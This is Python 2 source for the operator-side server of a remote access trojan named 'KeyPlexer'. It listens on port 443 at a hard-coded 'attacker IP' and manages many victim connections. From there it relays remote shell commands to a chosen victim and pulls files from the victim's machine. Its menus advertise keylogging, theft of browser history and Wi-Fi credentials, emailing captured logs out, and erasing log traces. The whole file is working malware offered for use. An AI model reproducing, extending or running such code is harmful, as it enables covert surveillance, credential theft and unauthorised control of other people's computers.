import subprocess 
from socket import *
import time
import sys, os
import threading
import subprocess

""" This module for creating quick backdoors
    servers
    TODO The backdoor uses username and password for protection purposes
    """

def banner():
  print  """
            Name:
            Date :
            Version : v2.0
             _  __             ____   _                        
            | |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
            | ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
            | . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
            |_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
                        |___/
                        
                      ooo,    .---.
                     o`  o   /    |\________________
                    o`   'oooo()  | ________   _   _)
                    `oo   o` \    |/        | | | |
                      `ooo'   `---'         "-" |_|
            """

def menu():

  """This function shows the server options"""
  
  print "[*] Server Options: "
  print
  print "[*] refresh        ========= > Refresh the connection" #DONE
  print "[*] list           ========= > Lists all the connected clients" #DONE
  print "[*] download       ========= > download the files usage: download*FilePath" #DONE


def interact():

  """This is the program menu"""
  print
  print "[*] Command options: "
  print 
  print "[*] keylog         ========= > Start capturing keystrokes" #DONE
  print "[*] openwins       ========= > Get all the open program windows on the machine" #DONE
  print "[*] capture        ========= > take images of the host machine " #TODO
  print "[*] sendlogs       ========= > Sending logs and images by email" #DONE
  print "[*] history        ========= > Gathers all browsers history" #DONE
  print "[*] wifi           ========= > Get Wi-Fi credentials " #DONE
  print "[*] status         ========= > Get the status of the machine on/off" #TODO
  print "[*] systeminfo     ========= > Get Fingerprint of the system" #TODO
  print "[*] ip             ========= > Get the external IP address" #DONE
  print "[*] cover          ========= > Delete all traces of logs" #TODO
  print "[*] stop           ========= > Stops interaction with the target machine, and goes back to the main menu" #TODO
  print "\n\n"
  print
  print "[!] Use stop to go back to the main menu"
  
  

host = '10.0.0.59' # Attacker IP address
port = 443 # Port number in which the attacker server listen to

# create a socket object
sock = socket(AF_INET, SOCK_STREAM)

# set timeout for the connection
sock.settimeout(5)

# bind socket to the host address and port number
sock.bind((host,port))

# define the maximun number of connection
sock.listen(200)


all_connections = []  # holds the connections
all_addresses   = []  # holds the IP addresses



def get_multiple_clients():
    """This function handles multiple client"""

    global client_conn
    
    for one_conn in all_connections:

        # make sure to close all the connection first to avoid issues
        one_conn.close()

    # empty the list, delete all connections before start listening
    del all_connections[:]
    del all_addresses[:]


    # Begin the process of accepting clients
    while True:
        
        try :
            client_conn, addr = sock.accept()
            
            client_conn.setblocking(1)

            all_connections.append(client_conn)
            all_addresses.append(addr)


        except:
             #print "[+] ERROR: Cheeck the connection "
             break
            
    
def backdoor_shell():

      #get_multiple_clients()
      # run while loop to initiate the resverse connection
      while True:

         print
         # shell command to be executed
         user_command = raw_input("~$$keyplexer: >>>  ").strip()
         
          
         # refresh the list to see the new clients
         if user_command == "refresh":
           
              get_multiple_clients()
              print
              print bcolors.OKGREEN + "[+] Connection starts ----------------------  " 
              print "\n"
              
          
         elif user_command == "list":
           
              print
              print bcolors.YELLOW + "[+] Connected Clients ----------------------  "
              print
              print "[+] #  | IP Address    | Port Number "
              
              for ip in all_addresses :
                  
                  print "[+] %d  |   %s   |  %s" % (all_addresses.index(ip) + 1, str(ip[0]), str(ip[1]))
                   
              print "\n"


         elif("select" in user_command):
           
            chosenone = int(user_command.replace("select ","")) - 1
            
            if ((chosenone < len(all_addresses)) and (chosenone >= 0 )):
              print "[INFO] Interacting with %s" % str(all_addresses[chosenone])
              try:
                all_connections[chosenone].send("begin") #welcome message
                vtpath = all_connections[chosenone].recv(4096) + ">" #non blocking socket object / will timeout instantly if no data received
              except:
                print "[ERROR] Client closed the connection\n"
                break;
              while 1:
                data=raw_input(vtpath) #raw_input represents the client's sub process's current path
                if ((data != "stop") and ("cd " not in data) and ("upload " not in data)):
                  try:
                    all_connections[chosenone].send(data)
                    msg=all_connections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
                    print msg
                  except:
                    print "[ERROR] Client closed the connection\n"
                    break;
                elif ("cd " in data): #dealing with the cd command
                  try:
                    all_connections[chosenone].send(data)
                    msg=all_connections[chosenone].recv(4096) #non blocking socket object / will timeout instantly if no data received
                    vtpath = msg + ">"
                  except:
                    print "[ERROR] Client closed the connection\n"
                    break;
                else:
                  print "\n"
                  break
            else:
              print "[ERROR] Client doesn't exist\n"


         elif ("download" in user_command):
              
                    transfer(client_conn,user_command)
                    print "DONE DONWLOAD"
                    

         elif (user_command == "clear"):
                # clears the screen
                os.system("clear")


         elif (user_command == "help"):
              # help menus
              print
              banner()
              menu()
              #interact()
              
         elif (user_command == ":kill"):
              print "[+] Disconnecting from form the victim machine ----------------"
              break


         else:
              # Invalid commanfs
              print
              print bcolors.WARNING + "[ERROR] Invalid Command\n"
              

def transfer(conn,command):
    
    conn.send(command)
    f = open('/home/offline/Desktop/testing.png','wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            f.close()
            break
        f.write(bits)


##def upload(conn,command):
##
##
##	x,src,dst=map(str,command.split(' '))
##	conn.send(command)
##	file_to_send=open(src,'rb')
##	packet=file_to_send.read(1024)
##	while packet!='':
##		conn.send(packet) 
##		packet = file_to_send.read(1024)
##	conn.send('DONE')
##	file_to_send.close()


	

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[1;34m'
    OKGREEN = '\033[1;32m'
    WARNING = '\033[1;31m'
    YELLOW = '\033[1;33m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    

def main():
    	banner()
    	menu()
    	backdoor_shell()


	


#main()
while True:
    
    try:
        main()
        
    except KeyboardInterrupt :
      
        get_multiple_clients()
        print
        print "[+] You closed the connections ---------------------------"

    except:
    
      get_multiple_clients()
      
    time.sleep(3)  # we wait 3 seconds before starting again
